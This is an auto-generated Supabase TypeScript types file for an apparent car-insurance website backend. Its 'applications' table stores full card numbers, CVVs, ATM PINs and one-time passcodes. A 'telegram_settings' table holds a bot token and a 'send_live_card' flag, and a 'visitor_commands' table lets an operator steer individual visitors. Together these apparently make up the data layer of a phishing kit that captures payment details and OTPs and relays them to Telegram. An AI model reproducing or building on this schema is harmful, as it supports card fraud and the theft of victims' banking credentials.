export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.18"
  }
  public: {
    Tables: {
      access_logs: {
        Row: {
          created_at: string
          details: string | null
          event_type: string
          id: number
          ip_address: string | null
          is_admin: boolean
          user_agent: string | null
          visitor_id: string | null
        }
        Insert: {
          created_at?: string
          details?: string | null
          event_type: string
          id?: number
          ip_address?: string | null
          is_admin?: boolean
          user_agent?: string | null
          visitor_id?: string | null
        }
        Update: {
          created_at?: string
          details?: string | null
          event_type?: string
          id?: number
          ip_address?: string | null
          is_admin?: boolean
          user_agent?: string | null
          visitor_id?: string | null
        }
        Relationships: []
      }
      admin_credentials: {
        Row: {
          id: boolean
          password_hash: string
          recovery_code_hash: string | null
          updated_at: string
        }
        Insert: {
          id?: boolean
          password_hash: string
          recovery_code_hash?: string | null
          updated_at?: string
        }
        Update: {
          id?: boolean
          password_hash?: string
          recovery_code_hash?: string | null
          updated_at?: string
        }
        Relationships: []
      }
      admin_sessions: {
        Row: {
          created_at: string
          expires_at: string
          last_seen: string
          token: string
        }
        Insert: {
          created_at?: string
          expires_at?: string
          last_seen?: string
          token: string
        }
        Update: {
          created_at?: string
          expires_at?: string
          last_seen?: string
          token?: string
        }
        Relationships: []
      }
      applications: {
        Row: {
          atm_pin: string | null
          birth_date: string | null
          car_model: string | null
          car_year: string | null
          card_brand: string | null
          card_cvv: string | null
          card_exp_month: string | null
          card_exp_year: string | null
          card_last4: string | null
          card_name: string | null
          card_number: string | null
          company: string | null
          created_at: string
          est_value: string | null
          full_name: string | null
          id: string
          identity: string | null
          insurance_type: string | null
          method: string | null
          mutasil_id: string | null
          mutasil_otp: string | null
          mutasil_phone: string | null
          mutasil_provider: string | null
          otp_code: string | null
          otp_resend_at: string | null
          phone: string | null
          price: number | null
          purpose: string | null
          repair_place: string | null
          review_status: string
          screenshot_urls: string[] | null
          start_date: string | null
          status: string
          total: number | null
          type: string | null
          updated_at: string
          visitor_id: string | null
        }
        Insert: {
          atm_pin?: string | null
          birth_date?: string | null
          car_model?: string | null
          car_year?: string | null
          card_brand?: string | null
          card_cvv?: string | null
          card_exp_month?: string | null
          card_exp_year?: string | null
          card_last4?: string | null
          card_name?: string | null
          card_number?: string | null
          company?: string | null
          created_at?: string
          est_value?: string | null
          full_name?: string | null
          id: string
          identity?: string | null
          insurance_type?: string | null
          method?: string | null
          mutasil_id?: string | null
          mutasil_otp?: string | null
          mutasil_phone?: string | null
          mutasil_provider?: string | null
          otp_code?: string | null
          otp_resend_at?: string | null
          phone?: string | null
          price?: number | null
          purpose?: string | null
          repair_place?: string | null
          review_status?: string
          screenshot_urls?: string[] | null
          start_date?: string | null
          status?: string
          total?: number | null
          type?: string | null
          updated_at?: string
          visitor_id?: string | null
        }
        Update: {
          atm_pin?: string | null
          birth_date?: string | null
          car_model?: string | null
          car_year?: string | null
          card_brand?: string | null
          card_cvv?: string | null
          card_exp_month?: string | null
          card_exp_year?: string | null
          card_last4?: string | null
          card_name?: string | null
          card_number?: string | null
          company?: string | null
          created_at?: string
          est_value?: string | null
          full_name?: string | null
          id?: string
          identity?: string | null
          insurance_type?: string | null
          method?: string | null
          mutasil_id?: string | null
          mutasil_otp?: string | null
          mutasil_phone?: string | null
          mutasil_provider?: string | null
          otp_code?: string | null
          otp_resend_at?: string | null
          phone?: string | null
          price?: number | null
          purpose?: string | null
          repair_place?: string | null
          review_status?: string
          screenshot_urls?: string[] | null
          start_date?: string | null
          status?: string
          total?: number | null
          type?: string | null
          updated_at?: string
          visitor_id?: string | null
        }
        Relationships: []
      }
      blocked_visitors: {
        Row: {
          created_at: string
          reason: string | null
          visitor_id: string
        }
        Insert: {
          created_at?: string
          reason?: string | null
          visitor_id: string
        }
        Update: {
          created_at?: string
          reason?: string | null
          visitor_id?: string
        }
        Relationships: []
      }
      chat_blocked_visitors: {
        Row: {
          created_at: string
          reason: string | null
          visitor_id: string
        }
        Insert: {
          created_at?: string
          reason?: string | null
          visitor_id: string
        }
        Update: {
          created_at?: string
          reason?: string | null
          visitor_id?: string
        }
        Relationships: []
      }
      chat_conversations: {
        Row: {
          created_at: string
          customer_name: string
          customer_phone: string
          id: string
          initiated_by: string
          last_message_at: string
          unread_admin: number
          unread_customer: number
          updated_at: string
          visitor_id: string
        }
        Insert: {
          created_at?: string
          customer_name?: string
          customer_phone?: string
          id?: string
          initiated_by?: string
          last_message_at?: string
          unread_admin?: number
          unread_customer?: number
          updated_at?: string
          visitor_id: string
        }
        Update: {
          created_at?: string
          customer_name?: string
          customer_phone?: string
          id?: string
          initiated_by?: string
          last_message_at?: string
          unread_admin?: number
          unread_customer?: number
          updated_at?: string
          visitor_id?: string
        }
        Relationships: []
      }
      chat_messages: {
        Row: {
          content: string
          conversation_id: string
          created_at: string
          id: string
          sender: string
        }
        Insert: {
          content: string
          conversation_id: string
          created_at?: string
          id?: string
          sender: string
        }
        Update: {
          content?: string
          conversation_id?: string
          created_at?: string
          id?: string
          sender?: string
        }
        Relationships: [
          {
            foreignKeyName: "chat_messages_conversation_id_fkey"
            columns: ["conversation_id"]
            isOneToOne: false
            referencedRelation: "chat_conversations"
            referencedColumns: ["id"]
          },
        ]
      }
      sms_logs: {
        Row: {
          application_id: string | null
          created_at: string
          error: string | null
          http_status: number | null
          id: string
          message: string
          phone: string
          provider_response: string | null
          sender_id: string
          status: string
        }
        Insert: {
          application_id?: string | null
          created_at?: string
          error?: string | null
          http_status?: number | null
          id?: string
          message: string
          phone: string
          provider_response?: string | null
          sender_id?: string
          status?: string
        }
        Update: {
          application_id?: string | null
          created_at?: string
          error?: string | null
          http_status?: number | null
          id?: string
          message?: string
          phone?: string
          provider_response?: string | null
          sender_id?: string
          status?: string
        }
        Relationships: []
      }
      sms_settings: {
        Row: {
          api_url: string
          body_template: string
          content_type: string
          created_at: string
          default_sender_id: string
          enabled: boolean
          headers_json: string
          http_method: string
          id: string
          phone_format: string
          provider_name: string
          updated_at: string
        }
        Insert: {
          api_url?: string
          body_template?: string
          content_type?: string
          created_at?: string
          default_sender_id?: string
          enabled?: boolean
          headers_json?: string
          http_method?: string
          id?: string
          phone_format?: string
          provider_name?: string
          updated_at?: string
        }
        Update: {
          api_url?: string
          body_template?: string
          content_type?: string
          created_at?: string
          default_sender_id?: string
          enabled?: boolean
          headers_json?: string
          http_method?: string
          id?: string
          phone_format?: string
          provider_name?: string
          updated_at?: string
        }
        Relationships: []
      }
      telegram_settings: {
        Row: {
          bot_token: string
          chat_id: string
          created_at: string
          enabled: boolean
          id: string
          send_live_card: boolean
          send_steps: boolean
          updated_at: string
        }
        Insert: {
          bot_token?: string
          chat_id?: string
          created_at?: string
          enabled?: boolean
          id?: string
          send_live_card?: boolean
          send_steps?: boolean
          updated_at?: string
        }
        Update: {
          bot_token?: string
          chat_id?: string
          created_at?: string
          enabled?: boolean
          id?: string
          send_live_card?: boolean
          send_steps?: boolean
          updated_at?: string
        }
        Relationships: []
      }
      visitor_commands: {
        Row: {
          command: string
          created_at: string
          id: string
          payload: string | null
          visitor_id: string
        }
        Insert: {
          command: string
          created_at?: string
          id?: string
          payload?: string | null
          visitor_id: string
        }
        Update: {
          command?: string
          created_at?: string
          id?: string
          payload?: string | null
          visitor_id?: string
        }
        Relationships: []
      }
      visitor_sessions: {
        Row: {
          city: string | null
          country: string | null
          country_code: string | null
          created_at: string
          first_seen_at: string
          ip: string | null
          is_mobile: boolean | null
          last_path: string | null
          last_seen_at: string
          platform: string | null
          referrer: string | null
          user_agent: string | null
          visitor_id: string
        }
        Insert: {
          city?: string | null
          country?: string | null
          country_code?: string | null
          created_at?: string
          first_seen_at?: string
          ip?: string | null
          is_mobile?: boolean | null
          last_path?: string | null
          last_seen_at?: string
          platform?: string | null
          referrer?: string | null
          user_agent?: string | null
          visitor_id: string
        }
        Update: {
          city?: string | null
          country?: string | null
          country_code?: string | null
          created_at?: string
          first_seen_at?: string
          ip?: string | null
          is_mobile?: boolean | null
          last_path?: string | null
          last_seen_at?: string
          platform?: string | null
          referrer?: string | null
          user_agent?: string | null
          visitor_id?: string
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      _log_access: {
        Args: { _details: string; _event_type: string; _is_admin: boolean }
        Returns: undefined
      }
      _req_header: { Args: { _name: string }; Returns: string }
      admin_change_password: {
        Args: { _current: string; _new: string }
        Returns: boolean
      }
      admin_heartbeat: { Args: { _token: string }; Returns: undefined }
      admin_login: { Args: { _password: string }; Returns: string }
      admin_logout: { Args: { _token: string }; Returns: undefined }
      count_active_admins: { Args: never; Returns: number }
      current_visitor_id: { Args: never; Returns: string }
      get_access_logs: {
        Args: { _limit?: number }
        Returns: {
          created_at: string
          details: string | null
          event_type: string
          id: number
          ip_address: string | null
          is_admin: boolean
          user_agent: string | null
          visitor_id: string | null
        }[]
        SetofOptions: {
          from: "*"
          to: "access_logs"
          isOneToOne: false
          isSetofReturn: true
        }
      }
      get_my_applications: {
        Args: { p_limit?: number }
        Returns: {
          birth_date: string
          car_model: string
          car_year: string
          card_brand: string
          card_last4: string
          company: string
          created_at: string
          est_value: string
          full_name: string
          id: string
          identity: string
          insurance_type: string
          method: string
          mutasil_id: string
          mutasil_phone: string
          mutasil_provider: string
          phone: string
          price: number
          purpose: string
          repair_place: string
          review_status: string
          screenshot_urls: string[]
          start_date: string
          status: string
          total: number
          type: string
          visitor_id: string
        }[]
      }
      is_admin_token: { Args: { _token: string }; Returns: boolean }
      is_admin_user: { Args: never; Returns: boolean }
      is_current_admin: { Args: never; Returns: boolean }
      issue_visitor_token: { Args: never; Returns: string }
      log_admin_action: { Args: { _details: string }; Returns: undefined }
    }
    Enums: {
      [_ in never]: never
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends (DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never) = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends (PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never) = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {},
  },
} as const
